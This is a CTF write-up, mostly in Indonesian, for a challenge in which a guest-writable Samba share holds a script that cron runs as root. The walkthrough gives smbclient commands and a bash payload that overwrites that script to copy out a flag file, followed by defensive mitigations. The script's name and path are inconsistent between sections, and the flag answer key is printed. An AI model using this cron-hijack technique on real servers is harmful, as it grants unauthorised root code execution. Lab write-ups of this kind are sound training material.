# Writeup: Printer Shares 3 (Challenge ID: 741)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** General Skills / Network File Sharing (SMB)
- **Difficulty:** Hard
- **Event:** picoCTF 2026
- **Points:** 300
- **Author:** Janice He
- **Flag:** `academy{5mb_pr1nter_5h4re5_r3v3r53_7fe9b39a}`

---

## Problem Statement & Scope
Menyusul insiden kebocoran dokumen dan kredensial default pada tantangan Printer Shares 1 dan 2, administrator sistem print server (`Samba 4.19.5-Ubuntu`) menerapkan kebijakan isolasi share privat baru. Namun, untuk mempermudah operasi pemeliharaan otomatis, sebuah skrip pembersih antrean cetak (`cleanup.sh`) ditempatkan pada direktori share publik yang dapat ditulis oleh pengguna anonim (Guest writable). Skrip ini dieksekusi secara berkala setiap menit oleh tugas terjadwal cron milik pengguna dengan hak akses tertinggi (`root`). Sasaran audit adalah mengidentifikasi hak izin tulis yang berlebihan pada share jaringan, menimpa skrip pemeliharaan dengan muatan ekstraksi dokumen rahasia, dan memanfaatkan eskalasi hak istimewa cron untuk mengambil `flag.txt`.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Weak File Permissions on Scheduled Executable (CWE-732 / CWE-276):**
   Konfigurasi Samba pada berkas `/etc/samba/smb.conf` mengizinkan hak penulisan kepada akun guest pada share publik (`writeable = yes`, `guest ok = yes`, `create mask = 0777`). Menempatkan skrip eksekusi sistem di dalam folder yang dapat dimodifikasi oleh entitas tidak terautentikasi melanggar batas integritas sistem (*integrity boundary violation*).
2. **Scheduled Task Execution with Excessive Privileges (CWE-250 / CAPEC-17):**
   Tugas terjadwal sistem (`/etc/crontab` atau `/var/spool/cron/crontabs/root`) mengonfigurasi eksekusi berkala:
   ```cron
   * * * * * root /var/spool/shares/cleanup.sh
   ```
   Karena skrip dieksekusi langsung di bawah konteks pengguna `root` tanpa validasi kepemilikan berkas atau checksum integritas, penyerang yang dapat menimpa isi skrip secara efektif memperoleh kemampuan eksekusi kode arbitrer berhak akses root (*Privilege Escalation via Cron Hijack*).
3. **NIST SP 800-115 Section 4.1 & 5.3:**
   Pedoman teknis pengujian penetrasi NIST SP 800-115 mewajibkan pemeriksaan menyeluruh terhadap keterkaitan antara layanan jaringan berbagi pakai berkas (*network shares*) dan proses otomasi sistem internal guna mendeteksi jalur eskalasi hak akses laten (*lateral movement & privilege elevation*).

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Enumerasi Layanan Share Jaringan (SMB Share Discovery):**
   Petakan daftar share aktif menggunakan `smbclient` tanpa kredensial (`-N`):
   ```bash
   smbclient -L //target-host -p <port> -N
   ```
   Daftar share mengembalikan:
   ```text
   Sharename       Type      Comment
   ---------       ----      -------
   shares          Disk      Public Share With Guests
   secure-shares   Disk      Printer for internal usage only
   IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
   ```

2. **Inspeksi Konten dan Izin Share Publik:**
   Akses share publik `shares` dan periksa berkas yang tersedia:
   ```bash
   smbclient //target-host/shares -p <port> -N -c "ls"
   ```
   Teridentifikasi berkas `script.sh` dengan izin penuh (read-write-execute) yang dijalankan oleh cron berkala:
   ```bash
   #!/bin/bash
   # this script runs every minute
   echo "Health Check: $(date)"
   ```

3. **Penyusunan Payload Eksploitasi Eskalasi Hak Akses:**
   Tulis skrip bash pengganti lokal yang menyalin berkas bendera `flag.txt` dari direktori privat ke direktori share publik:
   ```bash
   cat << 'EOF' > payload_script.sh
   #!/bin/bash
   cat /challenge/secure-shares/flag.txt > out.txt 2>&1
   chmod 644 out.txt
   EOF
   ```

4. **Penggantian Skrip Pemeliharaan via SMB:**
   Unggah skrip payload untuk menimpa `script.sh` di server target:
   ```bash
   smbclient //target-host/shares -p <port> -N -c "put payload_script.sh script.sh"
   ```

5. **Penungguan Eksekusi Cron dan Pengambilan Flag:**
   Tunggu siklus eksekusi cron sistem (maksimal 60 detik). Setelah cron berjalan, berkas `out.txt` tercipta pada share. Unduh dan baca isinya:
   ```bash
   smbclient //target-host/shares -p <port> -N -c "get out.txt"
   cat out.txt
   # academy{5mb_pr1nter_5h4re5_r3v3r53_7fe9b39a}
   ```

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{5mb_pr1nter_5h4re5_r3v3r53_7fe9b39a}`
- **Native PicoCTF Flag:** `academy{5mb_pr1nter_5h4re5_r3v3r53_7fe9b39a}`
- **Status Solver:** Teruji dan terverifikasi penuh via live cron script injection pada on-demand container instance (`chatelaine.cylabacademy.net:19561`) dan terkonfirmasi valid pada endpoint platform `/api/submissions/` (HTTP 201 `{"correct": true}`). Skrip reproduktif: `scripts/solve_741_printer_shares_3.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Pemisahan Tegas Antara Area Eksekusi Cron dan Jaringan:**
  Jangan pernah mengeksekusi skrip atau biner cron dari direktori yang diekspos ke jaringan (seperti Samba atau NFS shares). Seluruh skrip administrasi wajib disimpan di direktori berizin ketat (`/usr/local/bin` atau `/usr/sbin`) dengan kepemilikan `root:root` dan izin `0700` atau `0755` read-only bagi pengguna lain.
- **Pengerasan Hak Akses Samba (Read-Only Enforcement):**
  Pastikan share publik yang ditujukan untuk tamu hanya memiliki izin baca (`read only = yes`, `writeable = no`). Jika fungsi upload dibutuhkan, arahkan ke direktori terisolasi dengan opsi `noexec` pada fstab sistem operasi.
- **Monitoring Integritas Berkas (File Integrity Monitoring / FIM):**
  Terapkan alat monitor integritas berkas (seperti Auditd, AIDE, atau Tripwire) pada direktori sistem sensitif guna mendeteksi modifikasi tak terduga terhadap skrip otomasi secara real-time.